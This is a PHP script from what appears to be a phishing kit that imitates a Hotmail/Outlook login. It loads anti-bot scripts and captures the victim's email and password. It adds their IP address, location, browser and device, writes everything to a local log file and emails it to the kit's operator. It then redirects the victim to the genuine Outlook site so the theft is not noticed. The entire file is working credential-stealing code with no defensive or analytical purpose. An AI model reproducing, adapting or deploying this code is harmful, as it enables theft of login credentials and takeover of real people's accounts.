<?php
error_reporting(0);
include('antibots/antibot.php');
include('antibots/bitch.php');
if(isset($_POST['email'])){
include('./email.php');
include('./browser-info.php');
include('./get-ip.php');
$client_email = $_POST['email'];
$client_password = $_POST['password'] ;
date_default_timezone_set("Africa/Lagos");
$time = date('h:i:sa');
$date = date('d/m/Y');
$message = "
<div style='background: antiquewhite; padding: 20px; padding-top: 10px; box-shadow: 0 0 5px 5px lightgrey; font-family: calibri'>
    <h1 style='color: green; text-align: center'>Info</h1>
    <p style='color: '>
        <span style='font-weight: bold'>EMAIL </span>= ".$client_email."</br><span style='font-weight: bold'>PASSWORD </span>= ".$client_password."</br></br>
        
        <span style='font-weight: bold'>Ip address </span>= ".$ip."</br>
        <span style='font-weight: bold'>COUNTRY DETECTED </span>= ".$country."</br>
        <span style='font-weight: bold'>REGION(STATE) DETECTED </span>= ".$region."</br>
        <span style='font-weight: bold'>CITY DETECTED </span>= ".$city."</br>
        <span style='font-weight: bold'>DATE </span>= ".$date."</br>
        <span style='font-weight: bold'>TIME </span>= ".$time."</br>
        <span style='font-weight: bold'>BROWSER </span>= ".browser_type($_SERVER['HTTP_USER_AGENT'])."</br>
        <span style='font-weight: bold'>DEVICE </span>= ".OS($_SERVER['HTTP_USER_AGENT'])."
    </p>
</div>\n";
    $file = fopen("2ringa-info.txt", "a");
	$write = fwrite($file, $message);
	fclose($file);
    $subject = "HOTMAIL LOGIN LANDED!!! CLICK TO VIEW";
    $headers = "From: LIL-JAY <turingajay@gmail.com>\r\n";
    $headers .= "MIME-Version: 1.0 \r\n";  
    $headers .= "Content-type: text/html; charset=UTF-8 \r\n";
    $send = mail($reciever, $subject, $message, $headers);
echo "
<script>
    window.location = 'https://outlook.live.com/owa/';
</script>";

}else{
    header("location: index.php");
}
?>